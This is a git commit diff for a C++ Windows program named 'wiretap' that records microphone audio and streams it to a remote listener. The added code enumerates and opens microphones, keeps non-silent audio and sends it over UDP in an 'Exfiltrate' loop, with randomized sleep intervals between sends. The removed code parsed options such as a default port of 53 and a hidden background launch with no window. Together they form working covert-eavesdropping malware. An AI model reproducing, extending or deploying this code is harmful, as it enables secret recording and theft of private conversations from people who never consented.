33c68613069ed332b678f045377b34c4c23541f5
Drew <52759042+Drew-Alleman@users.noreply.github.com>
2025-12-21 20:47:24 -0700

    Fixed Zero Memory Bug

--- wiretap.cpp
+++ wiretap.cpp
@@ -1,172 +1,378 @@
 #include "audio.h"
-#include <string>
-#include <iostream>
-#include <vector>
 
-int ArgToInt(const std::string& argName, const char* value) {
-    try {
-        return std::stoi(value);
+void AudioManager::SetSleepMode(int modeInt) {
+    SleepProfile profile = static_cast<SleepProfile>(modeInt);
+    
+    float min = 5.0f;
+    float max = 10.0f;
+
+    switch (modeInt) {
+        case 0: min = 5.0f;  max = 20.0f; break; 
+        case 1: min = 10.0f; max = 40.0f; break;
+        case 2: min = 20.0f; max = 60.0f; break; 
+        case 3: min = 40.0f; max = 100.0f; break;
+        case 4: min = 15.0f;  max = 400.0f; break;
     }
-    catch (const std::invalid_argument&) {
-        throw std::runtime_error("[ERROR] Invalid integer for " + argName + ": " + value);
-    }
-    catch (const std::out_of_range&) {
-        throw std::runtime_error("[ERROR] Value out of range for " + argName + ": " + value);
-    }
+    this->dist = std::uniform_real_distribution<float>{ min, max };
 }
 
-void PrintHelp(const char* exe) {
-    std::cout <<
-        "Usage:\n"
-        "  " << exe << " [options]\n"
-        "\n"
-        "Options:\n"
-        "  --help                 Show this help message and exit\n"
-        "  --list                 List available microphones and exit\n"
-        "  --mic <index>          Microphone index to use (default: system default)\n"
-        "\n"
-        "  --server <ip>          Server IP address to send to (default: 127.0.0.1)\n"
-        "  --port <port>          UDP port to use (default: 53)\n"
-        "  --packet-size <bytes>  Client packet size in bytes (1–65355) (default: 1024)\n"
-        "\n"
-        "  --sleep <mode>         Sleep profile (0–4) (default: 2)\n"
-        "                         0 = 5–20s (Tiny)\n" 
-        "                         1 = 10–40s (Short)\n"
-        "                         2 = 20–60s (Normal)\n"
-        "                         3 = 40–100s (Long)\n"
-        "                         4 = 15–400s (Random)\n"
-        "\n"
-        "  --background           Run in the background (spawns a child process)\n"
-        "  --daemon               Internal: indicates the background child process\n"
-        "  --verbose              Enable verbose logging\n"
-        "\n"
-        "Examples:\n"
-        "  " << exe << " --list\n"
-        "  " << exe << " --mic 1 --server 192.168.1.10 --port 5353\n"
-        "  " << exe << " --packet-size 1400 --sleep 3 --background\n";
-}
+std::vector<std::wstring> AudioManager::GetMicrophones() {
+    std::vector<std::wstring> microphones;
 
-int main(int argc, char* argv[]) {
-    bool runInBackground = false;
-    bool isChildProcess = false;
-    bool listMicrophones = false;
-    bool isVerbose = false;
+    IMMDeviceEnumerator* pLocalEnumerator = NULL;
+    HRESULT hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL, __uuidof(IMMDeviceEnumerator), (void**)&pLocalEnumerator);
 
-    AudioManager AM;
-    int micIndex = -1;
-    int packetSize = 1024;
-    int sleepInput = 2;
-    std::string ip_address = "127.0.0.1";
-    int port = 53;
-    try {
-        for (int i = 1; i < argc; i++) {
-            std::string arg = argv[i];
-            if (arg == "--help") {
-                PrintHelp(argv[0]);
-                return 0;
-            }
-            if (arg == "--background") {
-                runInBackground = true;
-            }
-            else if (arg == "--daemon") {
-                isChildProcess = true;
-            }
-            else if (arg == "--list") {
-                listMicrophones = true;
-            }
-            else if (arg == "--verbose") {
-                isVerbose = true;
-            }
-            else if (arg == "--sleep" && i + 1 < argc) {
-                sleepInput = ArgToInt("--sleep", argv[++i]);
-                if (sleepInput < 0 || sleepInput > 4) {
-                    std::cerr << "[ERROR] Invalid sleep input: " << sleepInput << " must be between 0->4" << std::endl;
-                    return 1;
+    if (SUCCEEDED(hr)) {
+        IMMDeviceCollection* pCollection = NULL;
+        hr = pLocalEnumerator->EnumAudioEndpoints(eCapture, DEVICE_STATE_ACTIVE, &pCollection);
+
+        if (SUCCEEDED(hr)) {
+            UINT count;
+            pCollection->GetCount(&count);
+
+            for (UINT i = 0; i < count; i++) {
+                IMMDevice* pEndpoint = NULL;
+                pCollection->Item(i, &pEndpoint);
+
+                IPropertyStore* pProps = NULL;
+                pEndpoint->OpenPropertyStore(STGM_READ, &pProps);
+
+                PROPVARIANT varName;
+                PropVariantInit(&varName);
+
+                if (SUCCEEDED(pProps->GetValue(PKEY_Device_FriendlyName, &varName))) {
+                    if (varName.pwszVal != nullptr) {
+                        microphones.push_back(std::wstring(varName.pwszVal));
+                    }
                 }
-            }
-            else if (arg == "--packet-size" && i + 1 < argc) {
-                packetSize = ArgToInt("--packet-size", argv[++i]);
-                if (packetSize <= 0 || packetSize > 65355) {
-                    std::cerr << "[ERROR] Invalid packet size input: " << packetSize << " must be between 1->65355" << std::endl;
-                    return 1;
-                }
-            }
-            else if (arg == "--mic" && i + 1 < argc) {
-                micIndex = ArgToInt("--mic", argv[++i]);
-            }
-            else if (arg == "--server" && i + 1 < argc) {
-                ip_address = argv[++i];
-            }
-            else if (arg == "--port" && i + 1 < argc) {
-                port = ArgToInt("--port", argv[++i]);
-                if (port <= 0 || port > 65355) {
-                    std::cerr << "[ERROR] Invalid port: " << port << " must be between 1->65355" << std::endl;
-                    return 1;
-                }
-            }
-        }
-    }
-    catch (const std::exception& e) {
-        std::cerr << e.what() << std::endl;
-        return 1;
-    }
 
-    // 2. Background Spawning Logic
-    // If user wants background AND we aren't already the background child
-    if (runInBackground && !isChildProcess) {
-        char path[MAX_PATH];
-        GetModuleFileNameA(NULL, path, MAX_PATH);
-        std::string cmd = "\"" + std::string(path) + "\" --daemon";
-        for (int i = 1; i < argc; i++) {
-            std::string arg = argv[i];
-            if (arg != "--background") {
-                cmd += " " + arg;
+                PropVariantClear(&varName);
+                pProps->Release();
+                pEndpoint->Release();
             }
-        }
-
-        STARTUPINFOA si = { sizeof(si) };
-        PROCESS_INFORMATION pi;
-        ZeroMemory(&si, sizeof(si));
-        si.cb = sizeof(si);
-
-        if (CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
-            CloseHandle(pi.hProcess);
-            CloseHandle(pi.hThread);
-            return 0;
+            pCollection->Release();
         }
         else {
-            std::cerr << "[ERROR] Failed to create background process. Error: " << GetLastError() << "\n";
-            return 1;
+            std::cerr << "[ERROR] failed to enumerate audio enpoints" << std::endl;
+        }
+        pLocalEnumerator->Release();
+    }
+    else {
+        std::cerr << "[ERROR] failed to initialze local audio enumerator" << std::endl;
+
+    }
+    return microphones;
+}
+
+void AudioManager::ListMicrophones() {
+    int i = 1;
+    for (const std::wstring& microphone : GetMicrophones()) {
+        std::wcout << i << L". " << microphone << std::endl;
+        i++;
+    }
+}
+
+void AudioManager::SetIsVerbose(bool mode) {
+    isVerbose = mode;
+}
+
+void AudioManager::LogMessage(const std::string& message) {
+    if (isVerbose) {
+        std::cout << message << std::endl;
+    }
+}
+void AudioManager::SelectMicrophoneFromInt(int micIndex) {
+    if (!pEnumerator) {
+        (void)CoInitialize(NULL);
+        HRESULT hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL, __uuidof(IMMDeviceEnumerator), (void**)&pEnumerator);
+        if (FAILED(hr)) {
+            std::cerr << "[ERROR] failed to create instance of device enumerator" << std::endl;
+            return;
+        }
+    }
+    else {
+        std::cerr << "[ERROR] the local audio enumerator failed to initialze; unable to select a microphone" << std::endl;
+    }
+
+    IMMDeviceCollection* pCollection = NULL;
+    HRESULT hr = pEnumerator->EnumAudioEndpoints(eCapture, DEVICE_STATE_ACTIVE, &pCollection);
+
+    if (SUCCEEDED(hr)) {
+        IMMDevice* pEndpoint = NULL;
+        if (SUCCEEDED(pCollection->Item(micIndex - 1, &pEndpoint))) {
+            LPWSTR pwszID = NULL;
+            if (SUCCEEDED(pEndpoint->GetId(&pwszID))) {
+                this->targetDeviceId = pwszID; 
+                CoTaskMemFree(pwszID);
+            }
+            pEndpoint->Release();
+        }
+        else {
+            std::cerr << "[ERROR] failed to fetch microphone from index: " << micIndex << " falling back to default microphone" << std::endl;
+        }
+        pCollection->Release();
+    }
+    else {
+        std::cerr << "[ERROR] failed to initialze local audio enumerator" << std::endl;
+    }
+}
+
+void AudioManager::RandomSleep() {
+    float value = dist(gen);
+
+    auto t0 = std::chrono::steady_clock::now();
+    std::this_thread::sleep_for(std::chrono::duration<float>(value));
+    auto t1 = std::chrono::steady_clock::now();
+    LogMessage("[INFO] sleeping for " + std::to_string(value) + " seconds");
+}
+
+void AudioManager::SetListener(std::string ip_address, int port) {
+    WSADATA wsa;
+    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
+        return;
+    }
+
+    udpSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    if (udpSocket == INVALID_SOCKET) {
+        WSACleanup();
+        std::cerr << "[ERROR] failed to create socket object" << std::endl;
+        return;
+    }
+
+    ZeroMemory(&serverAddr, sizeof(serverAddr));
+    serverAddr.sin_family = AF_INET;
+    serverAddr.sin_port = htons(static_cast<u_short>(port));
+    if (inet_pton(AF_INET, ip_address.c_str(), &serverAddr.sin_addr) != 1) {
+        std::cerr << "[ERROR] bad IP address provided: " << ip_address << "\n";
+        return;
+    }
+    socketInitialized = true;
+    LogMessage("[INFO] connected to listener: " + ip_address + ":" + std::to_string(port));
+}
+
+bool AudioManager::Initialize() {
+    HRESULT hr;
+    hr = CoInitialize(NULL);
+
+    hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL, __uuidof(IMMDeviceEnumerator), (void**)&pEnumerator);
+    if (FAILED(hr)) return false;
+
+    if (targetDeviceId.empty()) {
+        if (FAILED(pEnumerator->GetDefaultAudioEndpoint(eCapture, eConsole, &pDevice))) {
+            std::cerr << "[ERROR] failed to grab default audio device." << std::endl;
+            return false;
+        }
+    }
+    else {
+        if (FAILED(pEnumerator->GetDevice(targetDeviceId.c_str(), &pDevice))) {
+            std::cerr << "[ERROR] failed to fetch device from the string: '" << targetDeviceId.c_str() << "'" << std::endl;
+            return false;
         }
     }
 
-    AM.SetIsVerbose(isVerbose);
-    AM.LogMessage(R"(
-        _         _
-__ __ _(_)_ _ ___| |_ __ _ _ __
-\ V  V / | '_/ -_)  _/ _` | '_ \
- \_/\_/|_|_| \___|\__\__,_| .__/
-                          |_|)");
-    if (micIndex != -1) {
-        AM.SelectMicrophoneFromInt(micIndex);
+    hr = pDevice->Activate(__uuidof(IAudioClient), CLSCTX_ALL, NULL, (void**)&pAudioClient);
+    if (FAILED(hr)) {
+        std::cerr << "[ERROR] failed to activate audio device!" << std::endl;
+        return false;
+    }
+
+    /* Note: We use a local struct to define our desired format.
+       We use the "AUTOCONVERTPCM" flag so Windows handles the math
+       of turning 48kHz Stereo into 16kHz Mono for us.
+    */
+    WAVEFORMATEX targetFormat = { 0 };
+    targetFormat.wFormatTag = WAVE_FORMAT_PCM;
+    targetFormat.nChannels = 1;
+    targetFormat.nSamplesPerSec = 16000;
+    targetFormat.wBitsPerSample = 16;     
+    targetFormat.nBlockAlign = 2;         
+    targetFormat.nAvgBytesPerSec = targetFormat.nSamplesPerSec * targetFormat.nBlockAlign;
+    targetFormat.cbSize = 0;
+
+    // Use AUDCLNT_STREAMFLAGS_AUTOCONVERTPCM to force the lower sample rate
+    hr = pAudioClient->Initialize(
+        AUDCLNT_SHAREMODE_SHARED,
+        AUDCLNT_STREAMFLAGS_AUTOCONVERTPCM | AUDCLNT_STREAMFLAGS_SRC_DEFAULT_QUALITY,
+        10000000,
+        0,
+        &targetFormat,
+        NULL
+    );
+
+    if (FAILED(hr)) {
+        // If 16kHz fails, fall back to the system mix format
+        pAudioClient->GetMixFormat(&pwfx);
+        hr = pAudioClient->Initialize(AUDCLNT_SHAREMODE_SHARED, 0, 10000000, 0, pwfx, NULL);
+        std::cerr << "[ERROR] failed to use 16Hz falling back to system default..." << std::endl;
+    }
+    else {
+        if (pwfx) CoTaskMemFree(pwfx); // Clean up old memory if it exists
+        pwfx = (WAVEFORMATEX*)CoTaskMemAlloc(sizeof(WAVEFORMATEX));
+        if (pwfx != 0) {
+            memcpy(pwfx, &targetFormat, sizeof(WAVEFORMATEX));
+        }
+        else {
+            std::cerr << "[ERROR] failed to initialize audio mix format" << std::endl;
+        }
+    }
+
+    hr = pAudioClient->GetService(__uuidof(IAudioCaptureClient), (void**)&pCaptureClient);
+    return SUCCEEDED(hr);
+}
+
+void AudioManager::Release() {
+	pAudioClient->Stop();
+	pAudioClient->Release();
+	pCaptureClient->Release();
+	pDevice->Release();
+	pEnumerator->Release();
+	CoUninitialize();
+}
+
+void AudioManager::LaunchSnifferThread() {
+	sniffer = std::thread(&AudioManager::AudioSniffer, this);
+}
+
+void AudioManager::AudioSniffer() {
+    pAudioClient->Start();
+    LogMessage("[INFO] started audio sniffer");
+    while (bRunning) {
+        UINT32 packetLength = 0;
+        pCaptureClient->GetNextPacketSize(&packetLength);
+
+        while (packetLength != 0) {
+            BYTE* pData;
+            UINT32 numFrames;
+            DWORD flags;
+
+            if (FAILED(pCaptureClient->GetBuffer(&pData, &numFrames, &flags, NULL, NULL))) break;
+
+            if (!(flags & AUDCLNT_BUFFERFLAGS_SILENT)) {
+                short* sData = (short*)pData;
+                float totalPower = 0.0f;
+
+                // Process 16-bit PCM Mono
+                for (UINT32 i = 0; i < numFrames; i++) {
+                    // Convert to absolute float for power calculation
+                    totalPower += fabsf((float)sData[i] / 32768.0f);
+                }
+
+                float averagePower = totalPower / numFrames;
+
+                // If power is above threshold, save the raw bytes
+                if (averagePower > 0.002f) {
+                    std::lock_guard<std::mutex> lock(bufferMutex);
+                    char* raw = reinterpret_cast<char*>(sData);
+                    globalAudioBuffer.insert(globalAudioBuffer.end(), raw, raw + (numFrames * sizeof(short)));
+                }
+            }
+
+            pCaptureClient->ReleaseBuffer(numFrames);
+            pCaptureClient->GetNextPacketSize(&packetLength);
+        }
+        Sleep(1);
+    }
+}
+
+void AudioManager::SetPacketSize(int size) {
+    packetSize = size;
+}
+
+void AudioManager::Exfiltrate() {
+    using clock = std::chrono::steady_clock;
+    auto nextFlush = clock::now();
+    const auto flushEvery = std::chrono::seconds(5);
+    LogMessage("[INFO] started exfiltration loop");
+    while (bRunning) {
+        RandomSleep();
+
+        if (clock::now() < nextFlush) {
+            std::this_thread::sleep_for(std::chrono::milliseconds(100));
+            continue;
+        }
+
+        std::vector<char> dataToProcess;
+        {
+            std::unique_lock<std::mutex> lock(bufferMutex);
+
+            if (globalAudioBuffer.size() < 10240 && bRunning) {
+                lock.unlock();
+                std::this_thread::sleep_for(std::chrono::milliseconds(200));
+                continue;
+            }
+
+            dataToProcess.swap(globalAudioBuffer);
+        }
+
+        if (dataToProcess.empty()) continue;
+
+        if (socketInitialized) {
+            size_t offset = 0;
+            size_t totalSize = dataToProcess.size();
+
+            while (offset < totalSize && bRunning) {
+                size_t remaining = totalSize - offset;
+                size_t toSend = (remaining > packetSize) ? packetSize : remaining;
+
+                int result = sendto(udpSocket,
+                    dataToProcess.data() + offset,
+                    static_cast<int>(toSend), 0,
+                    (struct sockaddr*)&serverAddr,
+                    sizeof(serverAddr));
+
+                if (result == SOCKET_ERROR) {
+                    int err = WSAGetLastError();
+                    if (err != 10054) {
+                        std::cerr << "[ERROR] socket error: " << err << "\n";
+                        break;
+                    }
+                }
+
+                offset += toSend;
+
+                /* PACING LOGIC:
+                   Sending 35k packets instantly is a "burst."
+                   This tiny sleep (1-2ms) ensures the network card and
+                   the receiver can breathe.
+                */
+                if (offset < totalSize) {
+                    std::this_thread::sleep_for(std::chrono::milliseconds(1));
+                }
+            }
+
+            std::string message =
+                "[INFO] exfiltrated " + std::to_string(totalSize / 1024) +
+                " KB across " + std::to_string(totalSize / packetSize + 1) +
+                " packets";
+            LogMessage(message);
+        }
+
+        nextFlush = clock::now() + flushEvery;
+    }
+}
+
+void AudioManager::Stop() {
+    LogMessage("[INFO] stopping");
+    bRunning = false;
+    if (sniffer.joinable()) sniffer.join();
+    if (exfilThread.joinable()) exfilThread.join();
+    Release();
+}
+
+void AudioManager::Start() {
+
+    if (!bRunning) {
+        bRunning = true;
+    }
+
+    if (!socketInitialized) {
+        std::cerr << "[ERROR] failed to connect to listener" << std::endl;
+        return;
     }
     
-    if (!AM.Initialize()) {
-        std::cerr << "[ERROR] Initialization failed.\n";
-        return 1;
-    }
 
-    // 3. Execution Flow
-    if (listMicrophones) {
-        AM.ListMicrophones();
-        return 0;
-    }
-
-    // Settings
-    AM.SetPacketSize(packetSize);
-    AM.SetSleepMode(sleepInput);
-    AM.SetListener(ip_address, port);
-
-    AM.Start();
-    return 0;
+    LaunchSnifferThread();
+    exfilThread = std::thread(&AudioManager::Exfiltrate, this);
+    exfilThread.join();
+    Stop();
 }
